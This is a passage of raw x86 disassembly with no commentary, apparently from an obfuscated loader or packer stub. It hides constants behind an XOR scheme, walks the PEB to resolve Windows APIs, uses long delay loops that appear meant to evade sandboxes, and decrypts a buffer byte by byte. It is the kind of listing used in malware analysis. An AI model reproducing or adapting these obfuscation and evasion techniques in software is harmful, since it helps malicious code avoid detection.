  42545f:	mov    DWORD PTR [ebp-0xd8],ecx
  425465:	mov    DWORD PTR [ebp-0x50],0xf89f05b0
  42546c:	mov    DWORD PTR [ebp-0x40],0xf89cb5b0
  425473:	mov    DWORD PTR [ebp-0x54],0xf89c85bc
  42547a:	push   0x25
  42547c:	pop    ecx
  42547d:	mov    DWORD PTR [ebp-0x38],ecx
  425480:	mov    DWORD PTR [ebp-0x38],ecx
  425483:	push   0x65
  425485:	pop    ecx
  425486:	mov    DWORD PTR [ebp-0x38],ecx
  425489:	mov    DWORD PTR [ebp-0x38],ecx
  42548c:	mov    DWORD PTR [ebp-0x38],0x4d
  425493:	mov    DWORD PTR [ebp-0x38],0x43
  42549a:	mov    ecx,DWORD PTR [ebp-0x10]
  42549d:	xor    ecx,ebx
  42549f:	add    ecx,eax
  4254a1:	mov    DWORD PTR [ebp-0x38],ecx
  4254a4:	mov    ecx,DWORD PTR [ebp-0x10]
  4254a7:	xor    ecx,ebx
  4254a9:	add    ecx,eax
  4254ab:	mov    DWORD PTR [ebp-0x38],ecx
  4254ae:	mov    DWORD PTR [ebp-0x28],0x258
  4254b5:	mov    DWORD PTR [ebp-0x20],0x36
  4254bc:	mov    DWORD PTR [ebp-0x14],0x7a
  4254c3:	lea    edi,[ebp-0x10c]
  4254c9:	lea    esi,[ebp-0x12c]
  4254cf:	call   0x426191
  4254d4:	dec    DWORD PTR [ebp-0x14]
  4254d7:	jne    0x4254c3
  4254d9:	dec    DWORD PTR [ebp-0x20]
  4254dc:	jne    0x4254bc
  4254de:	dec    DWORD PTR [ebp-0x28]
  4254e1:	jne    0x4254b5
  4254e3:	mov    DWORD PTR [ebp-0x28],0x400e
  4254ea:	mov    eax,DWORD PTR [ebp-0x10]
  4254ed:	xor    eax,ebx
  4254ef:	mov    esi,0x3272ec
  4254f4:	add    eax,esi
  4254f6:	mov    DWORD PTR [ebp-0x1c],eax
  4254f9:	mov    eax,DWORD PTR [ebp-0x10]
  4254fc:	and    DWORD PTR [ebp-0x94],0x0
  425503:	xor    eax,ebx
  425505:	add    eax,esi
  425507:	mov    DWORD PTR [ebp-0x34],eax
  42550a:	mov    eax,fs:0x18
  425510:	mov    DWORD PTR [ebp-0x94],eax
  425516:	mov    eax,DWORD PTR [eax+0x30]
  425519:	mov    DWORD PTR [ebp-0xcc],eax
  42551f:	mov    eax,DWORD PTR [eax+0xc]
  425522:	mov    DWORD PTR [ebp-0xc0],eax
  425528:	mov    eax,DWORD PTR [ebp+0x8]
  42552b:	lea    ecx,[ebp-0x94]
  425531:	mov    DWORD PTR [eax+0x1a0],ecx
  425537:	mov    eax,DWORD PTR [ebp+0x8]
  42553a:	lea    ecx,[ebp-0xcc]
  425540:	mov    DWORD PTR [eax+0x1a4],ecx
  425546:	mov    eax,DWORD PTR [ebp+0x8]
  425549:	push   DWORD PTR [ebp+0x8]
  42554c:	lea    ecx,[ebp-0xc0]
  425552:	mov    DWORD PTR [eax+0x1a8],ecx
  425558:	call   0x427956
  42555d:	mov    ecx,DWORD PTR [ebp-0x10]
  425560:	xor    ecx,ebx
  425562:	add    ecx,esi
  425564:	cmp    ecx,eax
  425566:	je     0x4258e9
  42556c:	mov    eax,DWORD PTR [ebp+0x8]
  42556f:	mov    eax,DWORD PTR [eax+0x194]
  425575:	mov    ecx,DWORD PTR [eax]
  425577:	mov    eax,DWORD PTR [ebp+0x8]
  42557a:	mov    eax,DWORD PTR [eax+0x194]
  425580:	mov    eax,DWORD PTR [eax]
  425582:	add    eax,DWORD PTR [ecx+0x3c]
  425585:	mov    ecx,DWORD PTR [ebp+0x8]
  425588:	mov    ecx,DWORD PTR [ecx+0x1d8]
  42558e:	lea    edx,[ebp-0xec]
  425594:	push   edx
  425595:	mov    edx,DWORD PTR [ebp+0x8]
  425598:	mov    edx,DWORD PTR [edx+0x18c]
  42559e:	mov    edx,DWORD PTR [edx]
  4255a0:	add    edx,DWORD PTR [eax+0x88]
  4255a6:	push   0x4
  4255a8:	push   DWORD PTR [eax+0x8c]
  4255ae:	push   edx
  4255af:	call   DWORD PTR [ecx+0x1c]
  4255b2:	push   DWORD PTR [ebp+0x8]
  4255b5:	xor    eax,eax
  4255b7:	mov    DWORD PTR [ebp-0xa8],0x123f0f35
  4255c1:	mov    DWORD PTR [ebp-0xa4],0xb360c1d
  4255cb:	mov    DWORD PTR [ebp-0xa0],0x3d0c1103
  4255d5:	mov    BYTE PTR [ebp-0x9c],0x7a
  4255dc:	lea    edi,[ebp-0x9b]
  4255e2:	stos   DWORD PTR es:[edi],eax
  4255e3:	stos   WORD PTR es:[edi],ax
  4255e5:	stos   BYTE PTR es:[edi],al
  4255e6:	xor    eax,eax
  4255e8:	mov    DWORD PTR [ebp-0xbc],0x123f0f35
  4255f2:	mov    DWORD PTR [ebp-0xb8],0xb360c1d
  4255fc:	mov    DWORD PTR [ebp-0xb4],0x230c1103
  425606:	mov    BYTE PTR [ebp-0xb0],0x7a
  42560d:	lea    edi,[ebp-0xaf]
  425613:	stos   DWORD PTR es:[edi],eax
  425614:	stos   WORD PTR es:[edi],ax
  425616:	stos   BYTE PTR es:[edi],al
  425617:	mov    edi,DWORD PTR [ebp+0x8]
  42561a:	mov    eax,DWORD PTR [ebp+0x8]
  42561d:	mov    edx,DWORD PTR [eax+0x1b8]
  425623:	mov    DWORD PTR [ebp-0x68],0xc0e0f16
  42562a:	mov    DWORD PTR [ebp-0x64],0x150a091f
  425631:	mov    WORD PTR [ebp-0x60],0x7a3d
  425637:	mov    DWORD PTR [ebp-0x90],0x123f0f35
  425641:	mov    DWORD PTR [ebp-0x8c],0x163d0c1d
  42564b:	mov    DWORD PTR [ebp-0x88],0x281d120a
  425655:	mov    DWORD PTR [ebp-0x84],0xc110901
  42565f:	mov    DWORD PTR [ebp-0x80],0x7a3d1f15
  425666:	mov    DWORD PTR [ebp-0x7c],0x123f0f35
  42566d:	mov    DWORD PTR [ebp-0x78],0x163d0c1d
  425674:	mov    DWORD PTR [ebp-0x74],0x281d120a
  42567b:	mov    DWORD PTR [ebp-0x70],0xc110901
  425682:	mov    DWORD PTR [ebp-0x6c],0x7a231f15
  425689:	call   0x427985
  42568e:	push   eax
  42568f:	mov    eax,DWORD PTR [ebp+0x8]
  425692:	mov    eax,DWORD PTR [eax+0x1a8]
  425698:	push   DWORD PTR [eax]
  42569a:	call   0x427626
  42569f:	test   eax,eax
  4256a1:	jne    0x4256f3
  4256a3:	mov    eax,DWORD PTR [ebp+0x8]
  4256a6:	mov    eax,DWORD PTR [eax+0x1d8]
  4256ac:	mov    edi,DWORD PTR [ebp+0x8]
  4256af:	add    eax,0x4
  4256b2:	mov    DWORD PTR [ebp-0x24],eax
  4256b5:	mov    eax,DWORD PTR [ebp+0x8]
  4256b8:	mov    edx,DWORD PTR [eax+0x1b8]
  4256be:	call   0x427985
  4256c3:	push   eax
  4256c4:	mov    eax,DWORD PTR [ebp-0x24]
  4256c7:	call   DWORD PTR [eax]
  4256c9:	test   eax,eax
  4256cb:	jne    0x4256f3
  4256cd:	mov    eax,DWORD PTR [ebp+0x8]
  4256d0:	mov    eax,DWORD PTR [eax+0x1d8]
  4256d6:	mov    edi,DWORD PTR [ebp+0x8]
  4256d9:	add    eax,0x10
  4256dc:	mov    DWORD PTR [ebp-0x24],eax
  4256df:	mov    eax,DWORD PTR [ebp+0x8]
  4256e2:	mov    edx,DWORD PTR [eax+0x1b8]
  4256e8:	call   0x427985
  4256ed:	push   eax
  4256ee:	mov    eax,DWORD PTR [ebp-0x24]
  4256f1:	call   DWORD PTR [eax]
  4256f3:	mov    eax,DWORD PTR [ebp-0x10]
  4256f6:	mov    ecx,DWORD PTR [ebp-0x28]
  4256f9:	xor    eax,ebx
  4256fb:	add    eax,esi
  4256fd:	cmp    eax,ecx
  4256ff:	je     0x4258c2
  425705:	mov    eax,DWORD PTR [ebp-0x18]
  425708:	xor    eax,ebx
  42570a:	mov    ecx,0xffcd8d14
  42570f:	sub    ecx,eax
  425711:	add    ecx,DWORD PTR [ebp-0x28]
  425714:	mov    eax,DWORD PTR [ebp-0x1c]
  425717:	cmp    eax,ecx
  425719:	ja     0x4258c2
  42571f:	mov    DWORD PTR [ebp-0x20],0x0
  425726:	push   DWORD PTR [ebp+0x8]
  425729:	mov    edi,DWORD PTR [ebp+0x8]
  42572c:	mov    eax,DWORD PTR [ebp+0x8]
  42572f:	mov    edx,DWORD PTR [eax+0x1b4]
  425735:	call   0x427985
  42573a:	push   eax
  42573b:	mov    eax,DWORD PTR [ebp+0x8]
  42573e:	mov    eax,DWORD PTR [eax+0x1a8]
  425744:	push   DWORD PTR [eax]
  425746:	call   0x427626
  42574b:	mov    ecx,DWORD PTR [ebp+0x8]
  42574e:	mov    ecx,DWORD PTR [ecx+0x19c]
  425754:	mov    DWORD PTR [ecx],eax
  425756:	mov    eax,DWORD PTR [ebp+0x8]
  425759:	mov    edi,DWORD PTR [eax+0x1d8]
  42575f:	mov    esi,DWORD PTR [ebp+0x8]
  425762:	xor    eax,eax
  425764:	lea    edx,[ebp-0x7c]
  425767:	call   0x4279bb
  42576c:	push   eax
  42576d:	mov    eax,DWORD PTR [ebp+0x8]
  425770:	mov    eax,DWORD PTR [eax+0x19c]
  425776:	push   DWORD PTR [eax]
  425778:	call   DWORD PTR [edi+0x8]
  42577b:	mov    DWORD PTR [ebp-0x24],eax
  42577e:	mov    eax,DWORD PTR [ebp+0x8]
  425781:	mov    edi,DWORD PTR [eax+0x1d8]
  425787:	mov    esi,DWORD PTR [ebp+0x8]
  42578a:	xor    eax,eax
  42578c:	lea    edx,[ebp-0x90]
  425792:	call   0x4279bb
  425797:	push   eax
  425798:	mov    eax,DWORD PTR [ebp+0x8]
  42579b:	mov    eax,DWORD PTR [eax+0x19c]
  4257a1:	push   DWORD PTR [eax]
  4257a3:	call   DWORD PTR [edi+0x8]
  4257a6:	mov    eax,DWORD PTR [ebp+0x8]
  4257a9:	mov    edi,DWORD PTR [eax+0x1d8]
  4257af:	mov    esi,DWORD PTR [ebp+0x8]
  4257b2:	xor    eax,eax
  4257b4:	lea    edx,[ebp-0xa8]
  4257ba:	call   0x4279bb
  4257bf:	push   eax
  4257c0:	mov    eax,DWORD PTR [ebp+0x8]
  4257c3:	mov    eax,DWORD PTR [eax+0x19c]
  4257c9:	push   DWORD PTR [eax]
  4257cb:	call   DWORD PTR [edi+0x8]
  4257ce:	and    DWORD PTR [ebp-0x8],0x0
  4257d2:	mov    DWORD PTR [ebp-0x44],eax
  4257d5:	mov    eax,DWORD PTR [ebp-0x8]
  4257d8:	and    eax,0x7
  4257db:	add    eax,0x31
  4257de:	push   eax
  4257df:	call   DWORD PTR [ebp-0x24]
  4257e2:	test   eax,eax
  4257e4:	je     0x425828
  4257e6:	mov    eax,DWORD PTR [ebp-0x8]
  4257e9:	push   0x19
  4257eb:	xor    edx,edx
  4257ed:	pop    ecx
  4257ee:	div    ecx
  4257f0:	add    dl,0x41
  4257f3:	movzx  eax,dl
  4257f6:	push   eax
  4257f7:	call   DWORD PTR [ebp-0x44]
  4257fa:	test   eax,eax
  4257fc:	jne    0x425828
  4257fe:	mov    eax,DWORD PTR [ebp+0x8]
  425801:	mov    edi,DWORD PTR [eax+0x1d8]
  425807:	mov    esi,DWORD PTR [ebp+0x8]
  42580a:	xor    eax,eax
  42580c:	lea    edx,[ebp-0x68]
  42580f:	call   0x4279bb
  425814:	push   eax
  425815:	mov    eax,DWORD PTR [ebp+0x8]
  425818:	mov    eax,DWORD PTR [eax+0x198]
  42581e:	push   DWORD PTR [eax]
  425820:	call   DWORD PTR [edi+0x8]
  425823:	mov    DWORD PTR [ebp-0x14],eax
  425826:	jmp    0x42582c
  425828:	and    DWORD PTR [ebp-0x14],0x0
  42582c:	inc    DWORD PTR [ebp-0x8]
  42582f:	cmp    DWORD PTR [ebp-0x8],0x10
  425833:	jb     0x4257d5
  425835:	mov    eax,DWORD PTR [ebp-0x18]
  425838:	mov    esi,DWORD PTR [ebp+0x8]
  42583b:	xor    eax,ebx
  42583d:	mov    edi,0x3272ec
  425842:	add    eax,edi
  425844:	lea    edx,[ebp-0x10c]
  42584a:	call   0x4279bb
  42584f:	push   eax
  425850:	mov    eax,DWORD PTR [ebp-0x10]
  425853:	mov    esi,DWORD PTR [ebp+0x8]
  425856:	xor    eax,ebx
  425858:	add    eax,edi
  42585a:	lea    edx,[ebp-0x12c]
  425860:	call   0x4279bb
  425865:	push   eax
  425866:	call   DWORD PTR [ebp-0x14]
  425869:	mov    ecx,DWORD PTR [ebp-0x10]
  42586c:	xor    ecx,ebx
  42586e:	add    ecx,edi
  425870:	cmp    ecx,eax
  425872:	jne    0x42587b
  425874:	mov    DWORD PTR [ebp-0x20],0x1
  42587b:	mov    eax,DWORD PTR [ebp-0x18]
  42587e:	mov    ecx,DWORD PTR [ebp-0x1c]
  425881:	xor    eax,ebx
  425883:	lea    eax,[eax+ecx*1+0x3272ec]
  42588a:	mov    DWORD PTR [ebp-0x1c],eax
  42588d:	mov    eax,DWORD PTR [ebp-0x20]
  425890:	test   eax,eax
  425892:	je     0x4258a6
  425894:	mov    eax,DWORD PTR [ebp-0x18]
  425897:	mov    ecx,DWORD PTR [ebp-0x34]
  42589a:	xor    eax,ebx
  42589c:	lea    eax,[eax+ecx*1+0x3272ec]
  4258a3:	mov    DWORD PTR [ebp-0x34],eax
  4258a6:	mov    eax,DWORD PTR [ebp-0x18]
  4258a9:	xor    eax,ebx
  4258ab:	mov    ecx,0xffcd8d14
  4258b0:	sub    ecx,eax
  4258b2:	add    ecx,DWORD PTR [ebp-0x28]
  4258b5:	mov    eax,DWORD PTR [ebp-0x1c]
  4258b8:	cmp    eax,ecx
  4258ba:	jbe    0x42571f
  4258c0:	mov    esi,edi
  4258c2:	mov    eax,DWORD PTR [ebp-0x34]
  4258c5:	mov    ecx,DWORD PTR [ebp-0x1c]
  4258c8:	cmp    ecx,eax
  4258ca:	jne    0x4258dd
  4258cc:	push   DWORD PTR [ebp+0x8]
  4258cf:	lea    eax,[ebp-0x3c]
  4258d2:	push   eax
  4258d3:	call   0x42842b
  4258d8:	mov    DWORD PTR [ebp-0x2c],eax
  4258db:	jmp    0x4258e9
  4258dd:	mov    eax,DWORD PTR [ebp-0x2c]
  4258e0:	mov    ecx,DWORD PTR [ebp-0x18]
  4258e3:	xor    ecx,ebx
  4258e5:	add    ecx,esi
  4258e7:	xor    DWORD PTR [eax],ecx
  4258e9:	mov    eax,DWORD PTR [ebp-0x10]
  4258ec:	mov    ecx,DWORD PTR [ebp-0x2c]
  4258ef:	xor    eax,ebx
  4258f1:	add    eax,esi
  4258f3:	cmp    eax,ecx
  4258f5:	je     0x42606f
  4258fb:	mov    eax,DWORD PTR [ebp-0x10]
  4258fe:	mov    ecx,DWORD PTR [ebp-0x3c]
  425901:	xor    eax,ebx
  425903:	add    eax,esi
  425905:	cmp    eax,ecx
  425907:	je     0x42606f
  42590d:	mov    eax,DWORD PTR [ebp-0x10]
  425910:	xor    eax,ebx
  425912:	add    eax,esi
  425914:	jmp    0x425932
  425916:	mov    edi,DWORD PTR [ebp-0x2c]
  425919:	mov    cl,al
  42591b:	and    cl,0x1f
  42591e:	or     dl,0xff
  425921:	sub    dl,cl
  425923:	add    BYTE PTR [edi+eax*1],dl
  425926:	mov    ecx,DWORD PTR [ebp-0x18]
  425929:	xor    ecx,ebx
  42592b:	lea    eax,[eax+ecx*1+0x3272ec]
  425932:	mov    ecx,DWORD PTR [ebp-0x3c]
  425935:	cmp    eax,ecx
  425937:	jb     0x425916
  425939:	mov    eax,DWORD PTR [ebp-0x3c]
  42593c:	mov    DWORD PTR [ebp-0x28],eax
  42593f:	mov    eax,DWORD PTR [ebp-0x2c]
  425942:	mov    DWORD PTR [ebp-0x34],0xf89c85b0
  425949:	mov    DWORD PTR [ebp-0xd4],eax
  42594f:	mov    edi,0xf89c85b1
  425954:	mov    DWORD PTR [ebp-0x30],edi
  425957:	mov    eax,DWORD PTR [ebp-0x34]
  42595a:	xor    eax,ebx
  42595c:	add    eax,esi
  42595e:	mov    DWORD PTR [ebp-0xc],eax
  425961:	mov    eax,DWORD PTR [ebp-0x34]
  425964:	xor    eax,ebx
  425966:	add    eax,esi
  425968:	mov    DWORD PTR [ebp-0x8],eax
  42596b:	mov    DWORD PTR [ebp-0x44],0xf89c8590
  425972:	mov    DWORD PTR [ebp-0x4c],0xf89c85bf
  425979:	mov    eax,DWORD PTR [ebp-0x34]
  42597c:	mov    ecx,DWORD PTR [ebp-0x28]
  42597f:	xor    eax,ebx
  425981:	add    eax,esi
  425983:	cmp    ecx,eax
  425985:	je     0x425b84
  42598b:	jmp    0x425b60
  425990:	mov    ecx,DWORD PTR [ebp-0xc]
  425993:	mov    eax,DWORD PTR [ebp-0x28]
  425996:	sub    eax,ecx
  425998:	mov    ecx,DWORD PTR [ebp-0x44]
  42599b:	xor    ecx,ebx
  42599d:	add    ecx,esi
  42599f:	xor    edx,edx
  4259a1:	div    ecx
  4259a3:	mov    DWORD PTR [ebp-0x8],eax
  4259a6:	mov    eax,DWORD PTR [ebp-0x4c]
  4259a9:	mov    ecx,DWORD PTR [ebp-0x8]
  4259ac:	xor    eax,ebx
  4259ae:	add    eax,esi
  4259b0:	cmp    ecx,eax
  4259b2:	jbe    0x4259be
  4259b4:	mov    eax,DWORD PTR [ebp-0x4c]
  4259b7:	xor    eax,ebx
  4259b9:	add    eax,esi
  4259bb:	mov    DWORD PTR [ebp-0x8],eax
  4259be:	mov    eax,DWORD PTR [ebp-0x44]
  4259c1:	mov    ecx,DWORD PTR [ebp-0x8]
  4259c4:	xor    eax,ebx
  4259c6:	add    eax,esi
  4259c8:	imul   eax,ecx
  4259cb:	mov    DWORD PTR [ebp-0x8],eax
  4259ce:	mov    eax,DWORD PTR [ebp-0x34]
  4259d1:	mov    ecx,DWORD PTR [ebp-0x8]
  4259d4:	xor    eax,ebx
  4259d6:	add    eax,esi
  4259d8:	cmp    ecx,eax
  4259da:	je     0x425b4e
  4259e0:	mov    eax,DWORD PTR [ebp-0x8]
  4259e3:	mov    DWORD PTR [ebp-0x14],eax
  4259e6:	mov    eax,DWORD PTR [ebp-0xc]
  4259e9:	add    eax,DWORD PTR [ebp-0xd4]
  4259ef:	mov    DWORD PTR [ebp-0x24],0xf89c85b0
  4259f6:	mov    DWORD PTR [ebp-0x20],edi
  4259f9:	mov    DWORD PTR [ebp-0xe8],0xf89c85b2
  425a03:	mov    DWORD PTR [ebp-0x8],eax
  425a06:	mov    DWORD PTR [ebp-0x38],0xf89c85b3
  425a0d:	mov    DWORD PTR [ebp-0x1c],edi
  425a10:	mov    eax,DWORD PTR [ebp-0x24]
  425a13:	xor    eax,ebx
  425a15:	add    eax,esi
  425a17:	jmp    0x425b0d
  425a1c:	mov    DWORD PTR [ebp-0xe0],0xf89c85bb
  425a26:	mov    DWORD PTR [ebp-0xc4],0xf89c858e
  425a30:	mov    eax,DWORD PTR [ebp-0x1c]
  425a33:	mov    ecx,DWORD PTR [ebp-0x48]
  425a36:	xor    eax,ebx
  425a38:	add    eax,esi
  425a3a:	imul   eax,ecx
  425a3d:	mov    ecx,DWORD PTR [ebp-0x8]
  425a40:	mov    al,BYTE PTR [eax+ecx*1]
  425a43:	mov    BYTE PTR [ebp-0x2],al
  425a46:	mov    eax,DWORD PTR [ebp-0x1c]
  425a49:	mov    ecx,DWORD PTR [ebp-0x48]
  425a4c:	xor    eax,ebx
  425a4e:	add    eax,esi
  425a50:	imul   eax,ecx
  425a53:	mov    ecx,DWORD PTR [ebp-0xe8]
  425a59:	xor    ecx,ebx
  425a5b:	add    eax,ecx
  425a5d:	mov    ecx,DWORD PTR [ebp-0x8]
  425a60:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272ec]
  425a68:	mov    ecx,DWORD PTR [ebp-0xe0]
  425a6e:	xor    ecx,ebx
  425a70:	lea    eax,[ecx+eax*1+0x3272ec]
  425a77:	movzx  ecx,BYTE PTR [ebp-0x2]
  425a7b:	xor    ecx,eax
  425a7d:	mov    BYTE PTR [ebp-0x2],cl
  425a80:	mov    al,BYTE PTR [ebp-0x2]
  425a83:	mov    ecx,DWORD PTR [ebp-0x1c]
  425a86:	mov    edx,DWORD PTR [ebp-0x48]
  425a89:	xor    ecx,ebx
  425a8b:	add    ecx,esi
  425a8d:	imul   ecx,edx
  425a90:	mov    edx,DWORD PTR [ebp-0x8]
  425a93:	mov    BYTE PTR [ecx+edx*1],al
  425a96:	mov    eax,DWORD PTR [ebp-0x1c]
  425a99:	mov    ecx,DWORD PTR [ebp-0x48]
  425a9c:	xor    eax,ebx
  425a9e:	add    eax,esi
  425aa0:	imul   eax,ecx
  425aa3:	mov    ecx,DWORD PTR [ebp-0x8]
  425aa6:	mov    al,BYTE PTR [eax+ecx*1]
  425aa9:	mov    BYTE PTR [ebp-0x2],al
  425aac:	mov    eax,DWORD PTR [ebp-0x1c]
  425aaf:	mov    ecx,DWORD PTR [ebp-0x48]
  425ab2:	xor    eax,ebx
  425ab4:	add    eax,esi
  425ab6:	imul   eax,ecx
  425ab9:	mov    ecx,DWORD PTR [ebp-0x20]
  425abc:	xor    ecx,ebx
  425abe:	add    eax,ecx
  425ac0:	mov    ecx,DWORD PTR [ebp-0x8]
  425ac3:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272ec]
  425acb:	mov    ecx,DWORD PTR [ebp-0xc4]
  425ad1:	xor    ecx,ebx
  425ad3:	lea    eax,[ecx+eax*1+0x3272ec]
  425ada:	movzx  ecx,BYTE PTR [ebp-0x2]
  425ade:	xor    ecx,eax
  425ae0:	mov    BYTE PTR [ebp-0x2],cl
  425ae3:	mov    al,BYTE PTR [ebp-0x2]
  425ae6:	mov    ecx,DWORD PTR [ebp-0x1c]
  425ae9:	mov    edx,DWORD PTR [ebp-0x48]
  425aec:	xor    ecx,ebx
  425aee:	add    ecx,esi
  425af0:	imul   ecx,edx
  425af3:	mov    edx,DWORD PTR [ebp-0x8]
  425af6:	mov    BYTE PTR [ecx+edx*1],al
  425af9:	mov    eax,DWORD PTR [ebp-0x38]
  425afc:	mov    ecx,DWORD PTR [ebp-0x20]
  425aff:	xor    eax,ebx
  425b01:	xor    ecx,ebx
  425b03:	add    eax,esi
  425b05:	add    ecx,esi
  425b07:	imul   eax,ecx
  425b0a:	add    eax,DWORD PTR [ebp-0x48]
  425b0d:	mov    DWORD PTR [ebp-0x48],eax
  425b10:	mov    eax,DWORD PTR [ebp-0x48]
  425b13:	mov    ecx,DWORD PTR [ebp-0x14]
  425b16:	cmp    ecx,eax
  425b18:	jb     0x425a1c
  425b1e:	mov    eax,DWORD PTR [ebp-0x20]
  425b21:	mov    ecx,DWORD PTR [ebp-0x14]
  425b24:	xor    eax,ebx
  425b26:	add    eax,esi
  425b28:	imul   eax,ecx
  425b2b:	mov    ecx,DWORD PTR [ebp-0x24]
  425b2e:	xor    ecx,ebx
  425b30:	add    ecx,esi
  425b32:	or     eax,ecx
  425b34:	mov    ecx,DWORD PTR [ebp-0x30]
  425b37:	xor    ecx,ebx
  425b39:	add    eax,ecx
  425b3b:	mov    ecx,DWORD PTR [ebp-0x30]
  425b3e:	xor    ecx,ebx
  425b40:	add    eax,ecx
  425b42:	mov    ecx,DWORD PTR [ebp-0xc]
  425b45:	lea    eax,[eax+ecx*1+0x64e5d8]
  425b4c:	jmp    0x425b5d
  425b4e:	mov    eax,DWORD PTR [ebp-0x30]
  425b51:	mov    ecx,DWORD PTR [ebp-0xc]
  425b54:	xor    eax,ebx
  425b56:	lea    eax,[eax+ecx*1+0x3272ec]
  425b5d:	mov    DWORD PTR [ebp-0xc],eax
  425b60:	mov    eax,DWORD PTR [ebp-0x30]
  425b63:	xor    eax,ebx
  425b65:	mov    ecx,0xffcd8d14
  425b6a:	sub    ecx,eax
  425b6c:	add    ecx,DWORD PTR [ebp-0x28]
  425b6f:	mov    eax,DWORD PTR [ebp-0x30]
  425b72:	mov    edx,DWORD PTR [ebp-0xc]
  425b75:	xor    eax,ebx
  425b77:	add    eax,esi
  425b79:	imul   eax,edx
  425b7c:	cmp    eax,ecx
  425b7e:	jbe    0x425990
  425b84:	mov    eax,DWORD PTR [ebp-0x10]
  425b87:	mov    ecx,DWORD PTR [ebp-0x3c]
  425b8a:	mov    eax,DWORD PTR [ebp+0x8]
  425b8d:	mov    edx,DWORD PTR [ebp-0x54]
  425b90:	mov    eax,DWORD PTR [eax+0x1d8]
  425b96:	xor    edx,ebx
  425b98:	add    edx,esi
  425b9a:	push   edx
  425b9b:	mov    edx,DWORD PTR [ebp-0x40]
  425b9e:	xor    edx,ebx
  425ba0:	add    edx,esi
  425ba2:	push   edx
  425ba3:	push   ecx
  425ba4:	mov    DWORD PTR [ebp-0x38],ecx
  425ba7:	mov    ecx,DWORD PTR [ebp-0x10]
  425baa:	xor    ecx,ebx
  425bac:	add    ecx,esi
  425bae:	push   ecx
  425baf:	call   DWORD PTR [eax+0x14]
  425bb2:	mov    edi,eax
  425bb4:	mov    eax,DWORD PTR [ebp-0x10]
  425bb7:	xor    eax,ebx
  425bb9:	add    eax,esi
  425bbb:	cmp    eax,edi
  425bbd:	je     0x425c18
  425bbf:	mov    eax,DWORD PTR [ebp-0x10]
  425bc2:	jmp    0x425be5
  425bc4:	mov    ecx,DWORD PTR [ebp-0x2c]
  425bc7:	xor    eax,ebx
  425bc9:	mov    cl,BYTE PTR [ecx+eax*1+0x3272ec]
  425bd0:	mov    BYTE PTR [eax+edi*1+0x3272ec],cl
  425bd7:	mov    ecx,DWORD PTR [ebp-0x18]
  425bda:	xor    ecx,ebx
  425bdc:	lea    eax,[ecx+eax*1+0x3272ec]
  425be3:	xor    eax,ebx
  425be5:	mov    ecx,DWORD PTR [ebp-0x3c]
  425be8:	sub    ecx,esi
  425bea:	xor    ecx,ebx
  425bec:	cmp    eax,ecx
  425bee:	jne    0x425bc4
  425bf0:	mov    eax,DWORD PTR [ebp+0x8]
  425bf3:	mov    ecx,DWORD PTR [ebp-0x50]
  425bf6:	mov    eax,DWORD PTR [eax+0x1d8]
  425bfc:	xor    ecx,ebx
  425bfe:	add    ecx,esi
  425c00:	push   ecx
  425c01:	mov    ecx,DWORD PTR [ebp-0x10]
  425c04:	xor    ecx,ebx
  425c06:	add    ecx,esi
  425c08:	push   ecx
  425c09:	push   DWORD PTR [ebp-0x2c]
  425c0c:	call   DWORD PTR [eax+0x18]
  425c0f:	mov    eax,DWORD PTR [ebp-0x38]
  425c12:	mov    DWORD PTR [ebp-0x2c],edi
  425c15:	mov    DWORD PTR [ebp-0x3c],eax
  425c18:	mov    eax,DWORD PTR [ebp-0x2c]
  425c1b:	mov    DWORD PTR [ebp-0x14],eax
  425c1e:	mov    eax,DWORD PTR [ebp-0x18]
  425c21:	mov    ecx,DWORD PTR [ebp-0x10]
  425c24:	xor    eax,ebx
  425c26:	add    eax,esi
  425c28:	mov    DWORD PTR [ebp-0x5c],0x3d222a22
  425c2f:	mov    DWORD PTR [ebp-0x58],0x37223f22
  425c36:	jmp    0x425c69
  425c38:	mov    edx,DWORD PTR [ebp-0x14]
  425c3b:	mov    edi,ecx
  425c3d:	xor    edi,ebx
  425c3f:	mov    cl,BYTE PTR [ebp+edi*1+0x327290]
  425c46:	movsx  edx,BYTE PTR [edi+edx*1+0x3272ec]
  425c4e:	xor    cl,0x79
  425c51:	sub    cl,0x3
  425c54:	movzx  ecx,cl
  425c57:	cmp    edx,ecx
  425c59:	jne    0x425c73
  425c5b:	mov    ecx,DWORD PTR [ebp-0x18]
  425c5e:	xor    ecx,ebx
  425c60:	lea    ecx,[ecx+edi*1+0x3272ec]
  425c67:	xor    ecx,ebx
  425c69:	cmp    ecx,0xf89c85b8
  425c6f:	jne    0x425c38
  425c71:	jmp    0x425c7a
  425c73:	mov    eax,DWORD PTR [ebp-0x10]
  425c76:	xor    eax,ebx
  425c78:	add    eax,esi
  425c7a:	mov    ecx,DWORD PTR [ebp-0x10]
  425c7d:	xor    ecx,ebx
  425c7f:	add    ecx,esi
  425c81:	cmp    ecx,eax
  425c83:	je     0x425df9
  425c89:	mov    eax,DWORD PTR [ebp-0x14]
  425c8c:	mov    eax,DWORD PTR [eax+0x8]
  425c8f:	mov    DWORD PTR [ebp-0xc],0xf89c85b0
  425c96:	mov    DWORD PTR [ebp-0x40],0xf89cc327
  425c9d:	mov    DWORD PTR [ebp-0x44],0xf89cb5b0
  425ca4:	mov    DWORD PTR [ebp-0x24],0xf89c85bc
  425cab:	mov    DWORD PTR [ebp-0x20],eax
  425cae:	mov    eax,DWORD PTR [ebp+0x8]
  425cb1:	mov    ecx,DWORD PTR [ebp-0x24]
  425cb4:	xor    ecx,ebx
  425cb6:	add    ecx,esi
  425cb8:	push   ecx
  425cb9:	mov    ecx,DWORD PTR [ebp-0x44]
  425cbc:	mov    eax,DWORD PTR [eax+0x1d8]
  425cc2:	xor    ecx,ebx
  425cc4:	add    ecx,esi
  425cc6:	push   ecx
  425cc7:	mov    ecx,DWORD PTR [ebp-0x40]
  425cca:	xor    ecx,ebx
  425ccc:	add    ecx,esi
  425cce:	push   ecx
  425ccf:	mov    ecx,DWORD PTR [ebp-0xc]
  425cd2:	xor    ecx,ebx
  425cd4:	add    ecx,esi
  425cd6:	push   ecx
  425cd7:	call   DWORD PTR [eax+0x14]
  425cda:	mov    edi,eax
  425cdc:	mov    eax,DWORD PTR [ebp+0x8]
  425cdf:	mov    ecx,DWORD PTR [ebp-0x24]
  425ce2:	mov    eax,DWORD PTR [eax+0x1d8]
  425ce8:	xor    ecx,ebx
  425cea:	add    ecx,esi
  425cec:	push   ecx
  425ced:	mov    ecx,DWORD PTR [ebp-0x44]
  425cf0:	xor    ecx,ebx
